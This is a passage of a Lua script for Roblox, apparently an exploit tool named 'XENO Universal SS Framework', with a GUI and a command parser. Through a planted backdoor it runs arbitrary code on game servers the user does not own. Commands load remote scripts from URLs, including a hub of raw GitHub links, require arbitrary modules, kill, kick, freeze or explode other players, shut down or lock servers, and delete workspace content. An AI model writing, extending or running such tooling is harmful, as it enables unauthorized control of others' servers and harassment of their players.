    heading(pg, "Reference", 4)
    local refCard = card(pg, 160, 5)
    U.new("TextLabel", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = table.concat({
            '<font color="#8A2BE2">Player Commands:</font>',
            ';kill <plr> · ;kick <plr> · ;god <plr> · ;freeze <plr>',
            ';speed <plr> <n> · ;jump <plr> <n> · ;tp <plr> <plr2>',
            ';ff <plr> · ;unff <plr> · ;explode <plr> · ;sit <plr>',
            ';invisible <plr> · ;visible <plr> · ;fire <plr>',
            '',
            '<font color="#8A2BE2">Server Commands:</font>',
            ';time <n> · ;fog <n> · ;gravity <n> · ;music <id>',
            ';stopmusic · ;message <text> · ;hint <text>',
            ';shutdown · ;lockserver · ;unlockserver',
            '',
            '<font color="#8A2BE2">Utility:</font>',
            ';require <id> · ;loadurl <url> · ;exec <code>',
            ';cmds · ;clear · Targets: me / all / others / name',
        }, "\n"),
        TextColor3 = T.Sub,
        TextSize = 11,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        RichText = true,
        Parent = refCard,
    })

    -- Command parser is attached after command registry (section 13)
    -- Store reference for later
    _G._XenoCmdInput = cmdInput
    _G._XenoAddHistory = addHistory
end

-- ═══════════════════════════════════════════════════
--  12 · PAGE CONTENT — SCRIPTS
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Scripts
    heading(pg, "Require Script Loader", 1)

    local requireCard = card(pg, 80, 2)
    local reqInput = inputField(requireCard, "Enter Module Asset ID...", 1)
    reqInput.Size = UDim2.new(1, 0, 0, 30)

    local reqBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = requireCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
        })
    })

    actionBtn(reqBtns, "⚡ Require", T.Primary, 1, function()
        local id = tonumber(reqInput.Text)
        if not id then Notify("Invalid module ID", T.Err); return end
        if not BD.active then Notify("No backdoor connected!", T.Err); return end
        local ok, err = BD:requireModule(id)
        if ok then
            Notify("Required module: " .. id, T.OK)
        else
            Notify("Require failed: " .. tostring(err), T.Err)
        end
    end)

    heading(pg, "URL Loader", 3)
    local urlCard = card(pg, 80, 4)
    local urlInput = inputField(urlCard, "Paste raw script URL...", 1)
    urlInput.Size = UDim2.new(1, 0, 0, 30)

    local urlBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = urlCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
        })
    })

    actionBtn(urlBtns, "🌐 Load URL", T.Accent, 1, function()
        local url = urlInput.Text
        if url == "" then Notify("Enter a URL first", T.Err); return end
        if not BD.active then Notify("No backdoor connected!", T.Err); return end
        local ok, err = BD:loadUrl(url)
        if ok then
            Notify("Loaded script from URL", T.OK)
        else
            Notify("URL load failed: " .. tostring(err), T.Err)
        end
    end)

    heading(pg, "Server-Side Code Executor", 5)
    local execCard = card(pg, 130, 6)
    local execBox = U.new("TextBox", {
        Size = UDim2.new(1, 0, 0, 80),
        BackgroundColor3 = T.Surface,
        BorderSizePixel = 0,
        Text = "",
        PlaceholderText = "-- Write server-side Lua code here...",
        PlaceholderColor3 = T.Sub,
        TextColor3 = T.OK,
        TextSize = 12,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        MultiLine = true,
        ClearTextOnFocus = false,
        TextWrapped = true,
        Parent = execCard,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 7)}),
        U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.4}),
        U.new("UIPadding", {
            PaddingTop = UDim.new(0,8), PaddingBottom = UDim.new(0,8),
            PaddingLeft = UDim.new(0,10), PaddingRight = UDim.new(0,10),
        }),
    })

    local execBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = execCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
        })
    })

    actionBtn(execBtns, "▶ Execute SS", T.OK, 1, function()
        if execBox.Text == "" then Notify("Write some code first", T.Warn); return end
        if not BD.active then Notify("No backdoor connected!", T.Err); return end
        local ok, err = BD:execCode(execBox.Text)
        if ok then
            Notify("Code executed server-side", T.OK)
        else
            Notify("Execution error: " .. tostring(err), T.Err)
        end
    end)

    actionBtn(execBtns, "🗑️ Clear", T.Sub, 2, function()
        execBox.Text = ""
    end)

    heading(pg, "Script Hub — Quick Load", 7)

    local hubEntries = {
        {name = "Infinite Yield",   desc = "Universal admin commands",    url = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
        {name = "Dex Explorer",     desc = "Game object explorer",        url = "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
        {name = "Remote Spy",       desc = "Monitor remote traffic",      url = "https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"},
    }

    for idx, entry in ipairs(hubEntries) do
        local hubCard = card(pg, 55, 7 + idx)
        U.new("TextLabel", {
            Size = UDim2.new(0.6, 0, 0, 16),
            BackgroundTransparency = 1,
            Text = "📜 " .. entry.name,
            TextColor3 = T.Text,
            TextSize = 13,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = hubCard,
        })
        U.new("TextLabel", {
            Size = UDim2.new(0.6, 0, 0, 14),
            Position = UDim2.new(0, 0, 0, 18),
            BackgroundTransparency = 1,
            Text = entry.desc,
            TextColor3 = T.Sub,
            TextSize = 11,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = hubCard,
        })
        actionBtn(hubCard, "Execute", T.Primary, 1, function()
            if not BD.active then Notify("No backdoor connected!", T.Err); return end
            local ok, err = BD:loadUrl(entry.url)
            if ok then
                Notify("Loaded: " .. entry.name, T.OK)
            else
                Notify("Failed: " .. tostring(err), T.Err)
            end
        end).Position = UDim2.new(1, -110, 0.5, -15)
        -- Fix button to right side
        local b = hubCard:FindFirstChildWhichIsA("TextButton")
        if b then b.AnchorPoint = Vector2.new(0, 0) end
    end
end

-- ═══════════════════════════════════════════════════
--  13 · PAGE CONTENT — SERVER
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Server
    heading(pg, "Server Controls", 1)

    -- Lighting controls
    local lightCard = card(pg, 110, 2)
    U.new("TextLabel", {
        Size = UDim2.new(1, 0, 0, 16),
        BackgroundTransparency = 1,
        Text = "🌤️ Lighting & Atmosphere",
        TextColor3 = T.Text,
        TextSize = 13,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = lightCard,
    })

    local lightGrid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 70),
        Position = UDim2.new(0, 0, 0, 22),
        BackgroundTransparency = 1,
        Parent = lightCard,
    }, {
        U.new("UIGridLayout", {
            CellSize = UDim2.new(0, 110, 0, 30),
            CellPadding = UDim2.new(0, 6, 0, 6),
            SortOrder = Enum.SortOrder.LayoutOrder,
        })
    })

    local serverActions = {
        {"☀️ Day",      'game.Lighting.ClockTime = 14',              T.Warn},
        {"🌙 Night",    'game.Lighting.ClockTime = 0',               T.Accent},
        {"🌫️ Fog On",   'game.Lighting.FogEnd = 80',                T.Sub},
        {"🌫️ Fog Off",  'game.Lighting.FogEnd = 100000',            T.Text},
        {"🔆 Bright",   'game.Lighting.Brightness = 3; game.Lighting.Ambient = Color3.new(1,1,1)', T.Warn},
        {"🌑 Dark",     'game.Lighting.Brightness = 0; game.Lighting.Ambient = Color3.new(0,0,0)', T.Sub},
    }

    for i, sa in ipairs(serverActions) do
        actionBtn(lightGrid, sa[1], sa[3], i, function()
            if not BD.active then Notify("No backdoor connected!", T.Err); return end
            local ok = BD:execCode(sa[2])
            if ok then Notify(sa[1] .. " applied", T.OK) end
        end)
    end

    -- Physics controls
    heading(pg, "Physics & World", 3)
    local physCard = card(pg, 80, 4)

    local gravInput = inputField(physCard, "Gravity (default: 196.2)...", 1)
    gravInput.Size = UDim2.new(0.65, 0, 0, 30)

    actionBtn(physCard, "Set Gravity", T.Primary, 2, function()
        local val = tonumber(gravInput.Text) or 196.2
        if not BD.active then Notify("No backdoor connected!", T.Err); return end
        BD:execCode("workspace.Gravity = " .. val)
        Notify("Gravity → " .. val, T.OK)
    end).Position = UDim2.new(0.68, 0, 0, 0)

    -- Misc server actions
    heading(pg, "Server Actions", 5)
    local miscGrid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 80),
        BackgroundTransparency = 1,
        LayoutOrder = 6,
        Parent = pg,
    }, {
        U.new("UIGridLayout", {
            CellSize = UDim2.new(0, 130, 0, 32),
            CellPadding = UDim2.new(0, 6, 0, 6),
            SortOrder = Enum.SortOrder.LayoutOrder,
        })
    })

    local miscActions = {
        {"🔒 Lock Server", function()
            BD:execCode('game.Players.MaxPlayers = #game.Players:GetPlayers()')
            Notify("Server locked", T.OK)
        end, T.Warn},
        {"🔓 Unlock Server", function()
            BD:execCode('game.Players.MaxPlayers = 50')
            Notify("Server unlocked", T.OK)
        end, T.OK},
        {"💣 Shutdown", function()
            BD:execCode('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("Server shutdown — XENO") end')
            Notify("Shutdown initiated", T.Err)
        end, T.Err},
        {"💬 Message", function()
            BD:execCode('local m = Instance.new("Message", workspace); m.Text = "XENO Framework v3.0"; game:GetService("Debris"):AddItem(m, 5)')
            Notify("Server message sent", T.OK)
        end, T.Accent},
        {"🎵 Stop Music", function()
            BD:execCode('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop() v:Destroy() end end')
            Notify("All sounds stopped", T.OK)
        end, T.Sub},
        {"🧹 Clean WS", function()
            BD:execCode('for _,v in pairs(workspace:GetChildren()) do if not v:IsA("Terrain") and not v:IsA("Camera") and not game.Players:GetPlayerFromCharacter(v) then pcall(function() v:Destroy() end) end end')
            Notify("Workspace cleaned", T.OK)
        end, T.Err},
    }

    for i, ma in ipairs(miscActions) do
        actionBtn(miscGrid, ma[1], ma[3], i, function()
            if not BD.active then Notify("No backdoor connected!", T.Err); return end
            ma[2]()
        end)
    end
end

-- ═══════════════════════════════════════════════════
--  14 · COMMAND REGISTRY & PARSER
-- ═══════════════════════════════════════════════════

local Commands = {}
local addHistory = _G._XenoAddHistory
local cmdInput   = _G._XenoCmdInput
_G._XenoAddHistory = nil
_G._XenoCmdInput   = nil

local function reg(name, aliases, usage, fn)
    local entry = {name = name, aliases = aliases or {}, usage = usage or "", fn = fn}
    Commands[name:lower()] = entry
    for _, a in ipairs(aliases) do
        Commands[a:lower()] = entry
    end
end

local function ssRun(code)
    if not BD.active then
        Notify("No backdoor connected!", T.Err)
        addHistory("✗ Not connected", "#F3788C")
        return false
    end
    local ok, err = BD:execCode(code)
    if not ok then
        addHistory("✗ " .. tostring(err), "#F3788C")
    end
    return ok
end

local function pRef(name)
    return string.format('game.Players["%s"]', name)
end

-- Player commands ──────────────────────────────────

reg("kill", {"slay"}, ";kill <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. '.Character:BreakJoints()')
        addHistory("→ kill " .. p.Name, "#F3788C")
    end
end)

reg("kick", {"boot"}, ";kick <plr> [reason]", function(args)
    local reason = table.concat(args, " ", 2) or "Kicked by XENO"
    if reason == "" then reason = "Kicked by XENO" end
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. ':Kick("' .. reason .. '")')
        addHistory("→ kick " .. p.Name, "#F3788C")
    end
end)

reg("god", {"godmode"}, ";god <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        local h = pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid")'
        ssRun(h .. '.MaxHealth = math.huge; ' .. h .. '.Health = math.huge')
        addHistory("→ god " .. p.Name, "#A6E3A1")
    end
end)

reg("speed", {"ws"}, ";speed <plr> <n>", function(args)
    local val = tonumber(args[2]) or 100
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = ' .. val)
        addHistory("→ speed " .. p.Name .. " = " .. val, "#B4A0FF")
    end
end)

reg("jumppower", {"jp", "jpower"}, ";jp <plr> <n>", function(args)
    local val = tonumber(args[2]) or 100
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid").JumpPower = ' .. val)
        addHistory("→ jumppower " .. p.Name .. " = " .. val, "#B4A0FF")
    end
end)

reg("freeze", {"fr"}, ";freeze <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. '.Character.HumanoidRootPart.Anchored = true')
        addHistory("→ freeze " .. p.Name, "#89B4FA")
    end
end)

reg("thaw", {"unfreeze"}, ";thaw <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. '.Character.HumanoidRootPart.Anchored = false')
        addHistory("→ thaw " .. p.Name, "#F9E2AF")
    end
end)

reg("tp", {"teleport"}, ";tp <plr1> <plr2>", function(args)
    local from = U.findPlayers(args[1] or "me")
    local to = U.findPlayers(args[2] or "me")
    if #from == 0 or #to == 0 then Notify("Player not found", T.Err); return end
    for _, p in ipairs(from) do
        ssRun(pRef(p.Name) .. '.Character.HumanoidRootPart.CFrame = '
            .. pRef(to[1].Name) .. '.Character.HumanoidRootPart.CFrame')
        addHistory("→ tp " .. p.Name .. " → " .. to[1].Name, "#B4A0FF")
    end
end)

reg("ff", {"forcefield"}, ";ff <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('Instance.new("ForceField", ' .. pRef(p.Name) .. '.Character)')
        addHistory("→ ff " .. p.Name, "#A6E3A1")
    end
end)

reg("unff", {}, ";unff <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('for _,v in pairs(' .. pRef(p.Name)
            .. '.Character:GetChildren()) do if v:IsA("ForceField") then v:Destroy() end end')
        addHistory("→ unff " .. p.Name, "#F3788C")
    end
end)

reg("explode", {"boom"}, ";explode <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('local e = Instance.new("Explosion", workspace); e.Position = '
            .. pRef(p.Name) .. '.Character.HumanoidRootPart.Position')
        addHistory("→ explode " .. p.Name, "#F3788C")
    end
end)

reg("fire", {}, ";fire <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('Instance.new("Fire", ' .. pRef(p.Name) .. '.Character.HumanoidRootPart)')
        addHistory("→ fire " .. p.Name, "#F9E2AF")
    end
end)

reg("sparkles", {"sp"}, ";sparkles <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('Instance.new("Sparkles", ' .. pRef(p.Name) .. '.Character.HumanoidRootPart)')
        addHistory("→ sparkles " .. p.Name, "#B4A0FF")
    end
end)

reg("smoke", {}, ";smoke <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('Instance.new("Smoke", ' .. pRef(p.Name) .. '.Character.HumanoidRootPart)')
        addHistory("→ smoke " .. p.Name, "#9399B2")
    end
end)

reg("invisible", {"invis"}, ";invisible <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('for _,v in pairs(' .. pRef(p.Name)
            .. '.Character:GetDescendants()) do if v:IsA("BasePart") then v.Transparency = 1 end '
            .. 'if v:IsA("Decal") then v.Transparency = 1 end end')
        addHistory("→ invisible " .. p.Name, "#9399B2")
    end
end)

reg("visible", {"vis"}, ";visible <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun('for _,v in pairs(' .. pRef(p.Name)
            .. '.Character:GetDescendants()) do if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then v.Transparency = 0 end '
            .. 'if v:IsA("Decal") then v.Transparency = 0 end end')
        addHistory("→ visible " .. p.Name, "#CDD6F4")
    end
end)

reg("sit", {}, ";sit <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1] or "me")) do
        ssRun(pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid").Sit = true')
        addHistory("→ sit " .. p.Name, "#9399B2")
    end
end)

-- Server commands ──────────────────────────────────

reg("time", {"clocktime"}, ";time <n>", function(args)
    ssRun('game.Lighting.ClockTime = ' .. (tonumber(args[1]) or 14))
    addHistory("→ time = " .. (args[1] or "14"), "#F9E2AF")
end)

reg("fog", {}, ";fog <n>", function(args)
    ssRun('game.Lighting.FogEnd = ' .. (tonumber(args[1]) or 100000))
    addHistory("→ fog = " .. (args[1] or "100000"), "#9399B2")
end)

reg("gravity", {"grav"}, ";gravity <n>", function(args)
    ssRun('workspace.Gravity = ' .. (tonumber(args[1]) or 196.2))
    addHistory("→ gravity = " .. (args[1] or "196.2"), "#B4A0FF")
end)

reg("music", {"play"}, ";music <id>", function(args)
    local id = tonumber(args[1]) or 0
    ssRun('local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://' .. id
        .. '"; s.Volume = 1; s.Looped = true; s:Play()')
    addHistory("→ music " .. id, "#B4A0FF")
end)

reg("stopmusic", {"stopsounds"}, ";stopmusic", function()
    ssRun('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop() v:Destroy() end end')
    addHistory("→ stopped all sounds", "#9399B2")
end)

reg("message", {"msg"}, ";message <text>", function(args)
    local txt = table.concat(args, " ")
    ssRun('local m = Instance.new("Message", workspace); m.Text = "' .. txt
        .. '"; game:GetService("Debris"):AddItem(m, 5)')
    addHistory("→ message: " .. txt, "#B4A0FF")
end)

reg("hint", {}, ";hint <text>", function(args)
    local txt = table.concat(args, " ")
    ssRun('local h = Instance.new("Hint", workspace); h.Text = "' .. txt
        .. '"; game:GetService("Debris"):AddItem(h, 5)')
    addHistory("→ hint: " .. txt, "#B4A0FF")
end)

reg("shutdown", {"sd"}, ";shutdown", function()
    ssRun('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("Server shutdown — XENO") end')
    addHistory("→ SERVER SHUTDOWN", "#F3788C")
end)

reg("lockserver", {"lock"}, ";lockserver", function()
    ssRun('game.Players.MaxPlayers = #game.Players:GetPlayers()')
    addHistory("→ server locked", "#F9E2AF")
end)

reg("unlockserver", {"unlock"}, ";unlockserver", function()
    ssRun('game.Players.MaxPlayers = 50')
    addHistory("→ server unlocked", "#A6E3A1")
end)

-- Utility commands ─────────────────────────────────

reg("require", {"req"}, ";require <moduleId>", function(args)
    local id = tonumber(args[1])
    if not id then Notify("Invalid module ID", T.Err); return end
    BD:requireModule(id)
    addHistory("→ require(" .. id .. ")", "#B4A0FF")
end)

reg("loadurl", {"url", "httpget"}, ";loadurl <url>", function(args)
    local url = args[1] or ""
    if url == "" then Notify("Provide a URL", T.Err); return end
    BD:loadUrl(url)
    addHistory("→ loadurl: " .. url:sub(1, 40) .. "...", "#B4A0FF")
end)

reg("exec", {"execute", "run"}, ";exec <code>", function(args)
    local code = table.concat(args, " ")
    ssRun(code)
    addHistory("→ exec: " .. code:sub(1, 50) .. "...", "#A6E3A1")
end)

reg("clear", {"cls"}, ";clear", function()
    cmdHistory = {}
    addHistory("Console cleared", "#9399B2")
end)

reg("cmds", {"commands", "help"}, ";cmds", function()
    local listed = {}
    for name, entry in pairs(Commands) do
        if not listed[entry] then
            addHistory(entry.usage, "#B4A0FF")
            listed[entry] = true
        end
    end
end)

-- Command input handler ───────────────────────────

if cmdInput then
    cmdInput.FocusLost:Connect(function(enter)
        if not enter then return end
        local raw = cmdInput.Text
        cmdInput.Text = ""

        if raw:sub(1, #CFG.Prefix) ~= CFG.Prefix then return end

        local body = raw:sub(#CFG.Prefix + 1)
        local parts = {}
        for word in body:gmatch("%S+") do
            parts[#parts+1] = word
        end
        if #parts == 0 then return end

        local cmdName = parts[1]:lower()
        table.remove(parts, 1)

        local entry = Commands[cmdName]
        if entry then
            addHistory(CFG.Prefix .. cmdName .. " " .. table.concat(parts, " "), "#8A2BE2")
            local ok, err = pcall(entry.fn, parts)
            if not ok then
                addHistory("✗ Error: " .. tostring(err), "#F3788C")
                Notify("Command error: " .. tostring(err), T.Err)
            end
        else
            addHistory("✗ Unknown command: " .. cmdName, "#F3788C")
            Notify("Unknown command: " .. cmdName, T.Err)
        end
    end)
end

-- Chat listener (for prefix commands in chat) ──────
LP.Chatted:Connect(function(msg)
    if msg:sub(1, #CFG.Prefix) ~= CFG.Prefix then return end
    local body = msg:sub(#CFG.Prefix + 1)
    local parts = {}
    for word in body:gmatch("%S+") do parts[#parts+1] = word end
    if #parts == 0 then return end

    local cmdName = parts[1]:lower()
    table.remove(parts, 1)

    local entry = Commands[cmdName]
    if entry then
        pcall(entry.fn, parts)
    end
end)

-- ═══════════════════════════════════════════════════
--  15 · KEYBIND TOGGLE
-- ═══════════════════════════════════════════════════

UIS.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == CFG.ToggleKey then
        main.Visible = not main.Visible
        if main.Visible then
            main.Size = UDim2.new(0, 0, 0, 0)
            U.tween(main, {Size = UDim2.new(0, W.Width, 0, W.Height)}, 0.4, Enum.EasingStyle.Back)
        end
    end
end)

-- ═══════════════════════════════════════════════════
--  16 · BOOT SEQUENCE
-- ═══════════════════════════════════════════════════

do
    -- Animate in
    main.Size = UDim2.new(0, 0, 0, 0)
    main.BackgroundTransparency = 1

    task.wait(0.15)
    U.tween(main, {
        Size = UDim2.new(0, W.Width, 0, W.Height),
        BackgroundTransparency = 0,
    }, 0.55, Enum.EasingStyle.Back)

    task.wait(0.6)

    -- Default tab
    switchTab("Dashboard")

    Notify("⚡ XENO v" .. CFG.Version .. " loaded", T.Primary)
    Notify("Toggle: RightShift  |  Prefix: " .. CFG.Prefix, T.Sub)
    Notify("Scanning for backdoors...", T.Warn)

    -- Watermark in output
    print([[
    ═══════════════════════════════════════
     ⚡ XENO Universal SS Framework v3.0
     Loaded successfully.
     Toggle UI: RightShift
     Command prefix: ]] .. CFG.Prefix .. [[
    
     Use ;cmds for command list.
    ═══════════════════════════════════════
    ]])
end
